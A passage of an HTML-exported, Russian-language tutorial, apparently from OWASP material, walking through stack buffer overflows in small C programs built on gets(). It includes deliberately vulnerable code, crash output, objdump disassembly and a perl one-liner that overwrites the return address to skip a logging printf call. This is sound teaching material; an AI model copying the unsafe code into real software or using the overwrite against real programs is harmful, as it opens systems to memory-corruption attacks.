+<p class=a0 style='margin-bottom:2.0pt;line-height:150%'><b><span lang=FR
+style='font-size:14.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>Пример 1</span></b></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>#include
+&lt;stdio.h&gt;</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>int main(int argc, char
+**argv)</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>{</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>char buf[8]; // buffer
+for eight characters</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>gets(buf); // read from
+stdio (sensitive function!)</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>printf(&quot;%s\n&quot;,
+buf); // print out data stored in buf</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>return 0; // 0 as
+return value</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>}</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Это очень
+простое приложение считывает из стандартного ввода массив символов и копирует
+его в буфер типа </span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>char.</span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>&nbsp;Размер этого буфера составляет восемь символов</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>&nbsp;После этого содержимое
+буфера отображается и приложение закрывается</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Компиляция
+программы</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>:</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>user@spin
+~/inzynieria $ gcc bo-simple.c -o bo-simple</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>/tmp/ccECXQAX.o: In
+function `main':</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>bo-simple.c:(.text+0x17):
+warning: the `gets' function is dangerous and</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>should not be used.</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>На этом
+этапе даже компилятор предполагает</span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>, </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>что функция </span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>gets()
+небезопасна.</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Пример
+использования</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>:</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>user@spin
+~/inzynieria $ ./bo-simple // program start</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>1234 // we eneter
+&quot;1234&quot; string from the keyboard</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>1234 // program prints
+out the conent of the buffer</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>user@spin
+~/inzynieria $ ./bo-simple // start</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>123456789012 // we
+eneter &quot;123456789012&quot;</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>123456789012 // content
+of the buffer &quot;buf&quot; ?!?!</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>Segmentation fault //
+information about memory segmenatation fault</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Нам удается
+</span><span lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>(не)</span><span lang=RU style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>удачно выполнить
+ошибочную операцию программой и спровоцировать ее аварийный выход</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Анализ
+проблемы</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>:</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Программа
+вызывает функцию</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>, </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>которая работает с буфером типа </span><span lang=PT
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>char </span><span lang=FR style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>и не делает проверок на
+переполнение размера, </span><span lang=RU style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>назначенного этому
+буферу</span><span lang=FR style='font-size:12.0pt;line-height:150%;font-family:
+"Times New Roman",serif;color:#454545'>.</span><span lang=RU style='font-size:
+12.0pt;line-height:150%;font-family:"Times New Roman",serif;color:#454545'>&nbsp;В
+результате можно преднамеренно или непреднамеренно сохранить в буфере больше
+данных</span><span lang=FR style='font-size:12.0pt;line-height:150%;font-family:
+"Times New Roman",serif;color:#454545'>, </span><span lang=RU style='font-size:
+12.0pt;line-height:150%;font-family:"Times New Roman",serif;color:#454545'>что
+вызовет ошибку</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>.</span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>&nbsp;Возникает следующий вопрос</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>: </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>в буфере хранится всего
+восемь символов</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>, </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>так почему функция </span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>printf() </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>вывела двенадцать</span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>?</span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>&nbsp;Ответ исходит из организации памяти процесса</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>&nbsp;Четыре символа</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>переполнившие буфер</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>также перезаписывают
+значение</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>, </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>хранящееся в одном из регистров</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>что было необходимо для
+корректного возврата функции</span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>.</span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>&nbsp;Непрерывность памяти привела к распечатке данных</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>хранящихся в этой области
+памяти</span><span lang=FR style='font-size:12.0pt;line-height:150%;font-family:
+"Times New Roman",serif;color:#454545'>.</span></p>
+
+<p class=a0 style='margin-bottom:2.0pt;line-height:150%'><b><span lang=FR
+style='font-size:14.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>Пример 2</span></b></p>
+
+<p class=a0><span style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>#include &lt;stdio.h&gt;</span></p>
+
+<p class=a0><span lang=IT style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>#include &lt;string.h&gt;</span></p>
+
+<p class=a0><span lang=FR style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>&nbsp;</span></p>
+
+<p class=a0><span lang=FR style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>void doit(void)</span></p>
+
+<p class=a0><span lang=FR style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>{</span></p>
+
+<p class=a0><span lang=FR style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>        char buf[8];</span></p>
+
+<p class=a0><span lang=FR style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>&nbsp;</span></p>
+
+<p class=a0><span lang=FR style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>        gets(buf);</span></p>
+
+<p class=a0><span lang=FR style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>          printf(&quot;%s\n&quot;, buf);</span></p>
+
+<p class=a0><span lang=FR style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>}</span></p>
+
+<p class=a0><span lang=FR style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>&nbsp;</span></p>
+
+<p class=a0><span style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>int main(void)</span></p>
+
+<p class=a0><span lang=FR style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>{</span></p>
+
+<p class=a0><span lang=FR style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>        printf(&quot;So... The End...\n&quot;);</span></p>
+
+<p class=a0><span lang=FR style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>        doit();</span></p>
+
+<p class=a0><span lang=FR style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>        printf(&quot;or... maybe not?\n&quot;);</span></p>
+
+<p class=a0><span lang=FR style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>&nbsp;</span></p>
+
+<p class=a0><span lang=FR style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>        return 0;</span></p>
+
+<p class=a0><span lang=FR style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>}</span></p>
+
+<p class=a0><span lang=FR style='font-size:12.0pt;font-family:"Times New Roman",serif;
+color:#454545'>&nbsp;</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Этот пример
+аналогичен первому</span><span lang=FR style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>.</span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>&nbsp;Кроме того</span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>, </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>до и после функции </span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>doit() </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>у нас есть два вызова функции </span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>printf().</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>Compilation:</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>&nbsp;</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>user@dojo-labs
+~/owasp/buffer_overflow $ gcc example02.c -o example02</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>-ggdb</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>/tmp/cccbMjcN.o: In
+function `doit':</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>/home/user/owasp/buffer_overflow/example02.c:8:
+warning: the `gets'</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>function is dangerous
+and should not be used.</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>&nbsp;</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>Usage example:</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>user@dojo-labs
+~/owasp/buffer_overflow $ ./example02</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>So... The
+End...</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>TEST                  
+// user data on input</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>TEST                  //
+print out stored user data</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>or... maybe not?</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Программа
+между двумя определенными вызовами </span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>printf() </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>отображает содержимое буфера</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>который заполняется данными</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>введенными пользователем</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>user@dojo-labs
+~/owasp/buffer_overflow $ ./example02</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>So... The
+End...</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>TEST123456789</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>TEST123456789</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Segmentation
+fault</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Поскольку
+размер буфера был определен </span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>(char
+buf[8]) </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>и он был заполнен
+тринадцатью символами типа </span><span lang=DA style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>char, </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>буфер переполнился</span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>.</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Если наше
+бинарное приложение имеет формат </span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>ELF, </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>то мы можем использовать программу </span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>objdump </span><span lang=RU style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>для его анализа и
+поиска необходимой информации для использования ошибки переполнения буфера</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Ниже
+приведен вывод</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>, </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>созданный </span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>objdump.</span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>&nbsp;Из этого вывода мы можем найти адреса</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>по которым вызывается </span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>printf() (0x80483d6 и 0x80483e7).</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>user@dojo-labs
+~/owasp/buffer_overflow $ objdump -d ./example02</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>&nbsp;</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 080483be
+&lt;main&gt;:</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 80483be:      
+8d 4c 24 04             lea    0x4(%esp),%ecx</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 80483c2:      
+83 e4 f0                and    $0xfffffff0,%esp</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 80483c5:      
+ff 71 fc                pushl  0xfffffffc(%ecx)</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 80483c8:      
+55                      push   %ebp</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 80483c9:      
+89 e5                   mov    %esp,%ebp</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 80483cb:      
+51                      push   %ecx</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 80483cc:      
+83 ec 04                sub    $0x4,%esp</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 80483cf:    
+  c7 04 24 bc 84 04 08    movl   $0x80484bc,(%esp)</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 80483d6:      
+e8 f5 fe ff ff          call   80482d0 &lt;puts@plt&gt;</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 80483db:      
+e8 c0 ff ff ff          call   80483a0 &lt;doit&gt;</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 80483e0:      
+c7 04 24 cd 84 04 08    movl   $0x80484cd,(%esp)</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 80483e7:  
+    e8 e4 fe ff ff          call   80482d0 &lt;puts@plt&gt;</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 80483ec:      
+b8 00 00 00 00          mov    $0x0,%eax</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 80483f1:      
+83 c4 04                add    $0x4,%esp</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 80483f4:      
+59                      pop    %ecx</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 80483f5:      
+5d                      pop    %ebp</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 80483f6:      
+8d 61 fc                lea    0xfffffffc(%ecx),%esp</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 80483f9:      
+c3                      ret</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 80483fa:      
+90                      nop</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 80483fb:      
+90                      nop</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Если второй
+вызов </span><span lang=FR style='font-size:12.0pt;line-height:150%;font-family:
+"Times New Roman",serif;color:#454545'>printf() </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>будет информировать администратора о выходе пользователя из
+системы </span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>(например, </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>закрытая сессия</span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>), </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>то мы можем попробовать пропустить этот шаг и закончить без
+вызова </span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>printf().</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>user@dojo-labs
+~/owasp/buffer_overflow $ perl -e 'print &quot;A&quot;x12</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'> 
+.&quot;\xf9\x83\x04\x08&quot;' | ./example02</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>  So... The
+End...</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>  AAAAAAAAAAAAu*.</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'> 
+Segmentation fault</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Приложение
+закончило свое выполнение с ошибкой сегментации</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>но второй вызов </span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>printf() </span><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>не
+состоялся</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>.</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Несколько
+слов пояснения:</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>perl -e
+'print «A</span><span lang=IT style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>»</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>x12 .\xf9\x83\x04\x08</span><span lang=IT style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>»</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>' </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>— выведет двенадцать
+символов «</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>A</span><span lang=IT
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
